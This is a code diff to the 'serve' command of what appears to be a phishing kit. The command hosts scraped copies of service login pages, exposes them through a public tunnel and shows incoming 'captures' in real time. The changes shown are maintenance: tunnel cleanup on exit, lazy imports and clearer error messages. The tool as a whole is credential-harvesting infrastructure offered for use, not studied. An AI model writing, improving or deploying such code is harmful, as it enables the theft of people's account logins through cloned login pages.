@@ -1,10 +1,9 @@
 import { createServer } from '../lib/server.js';
 import { getScrapedPage, getService } from '../lib/service-registry.js';
-import { startTunnel } from '../lib/tunnel.js';
+import { startTunnel, stopTunnel } from '../lib/tunnel.js';
 import { pickService, pickTunnelType } from '../lib/tui.js';
 import { printBanner, printSection, printSpin } from '../lib/ui.js';
 import chalk from 'chalk';
-import open from 'open';
 
 export async function serveCommand(serviceArg, options) {
   printBanner();
@@ -16,7 +15,6 @@ export async function serveCommand(serviceArg, options) {
     service = await pickService();
   }
 
-  // Check if page is scraped
   const html = getScrapedPage(service.id, 'login');
   if (!html && !service.custom) {
     console.log(chalk.yellow(`\n  ⚠  "${service.name}" hasn't been scraped yet.`));
@@ -36,17 +34,19 @@ export async function serveCommand(serviceArg, options) {
     return;
   }
 
-  // Start tunnel if requested
+  let tunnelProc = null;
   let tunnelUrl = null;
   if (options.tunnel) {
     const tunnelType = typeof options.tunnel === 'string' ? options.tunnel : await pickTunnelType();
     const tunnelSpin = printSpin(`Starting ${tunnelType} tunnel...`);
     try {
-      tunnelUrl = await startTunnel(tunnelType, serverInfo.port);
-      if (tunnelUrl) {
+      const result = await startTunnel(tunnelType, serverInfo.port);
+      if (result && result.url) {
+        tunnelUrl = result.url;
+        tunnelProc = result.proc;
         tunnelSpin.stop(`Tunnel active at ${chalk.green(tunnelUrl)}`);
       } else {
-        tunnelSpin.fail(`Could not get tunnel URL (might still be connecting)`);
+        tunnelSpin.fail(`Could not get tunnel URL. Is ${tunnelType} installed?`);
       }
     } catch (err) {
       tunnelSpin.fail(`Tunnel failed: ${err.message}`);
@@ -61,6 +61,8 @@ export async function serveCommand(serviceArg, options) {
   console.log(`  ${chalk.white('Local URL:')}  ${chalk.cyan(serverInfo.url)}`);
   if (tunnelUrl) {
     console.log(`  ${chalk.white('Public URL:')} ${chalk.green(tunnelUrl)}`);
+  } else if (options.tunnel) {
+    console.log(`  ${chalk.white('Tunnel:')}    ${chalk.red('failed')}`);
   }
   console.log(`  ${chalk.white('Captures:')}  ${chalk.yellow('0')} (watching...)`);
   console.log(chalk.gray('  ─────────────────────────────────────────────'));
@@ -68,11 +70,19 @@ export async function serveCommand(serviceArg, options) {
   console.log(chalk.gray('  Captures will appear here in real-time.'));
   console.log();
 
-  // Open browser
   if (options.open !== false) {
+    const open = (await import('open')).default;
     open(serverInfo.url).catch(() => {});
   }
 
-  // Keep the process alive
+  // Cleanup on exit
+  const cleanup = () => {
+    if (tunnelProc) stopTunnel(tunnelProc);
+    serverInfo.server.close();
+  };
+  process.on('SIGINT', () => { cleanup(); process.exit(0); });
+  process.on('SIGTERM', () => { cleanup(); process.exit(0); });
+
+  // Keep alive
   await new Promise(() => {});
 }
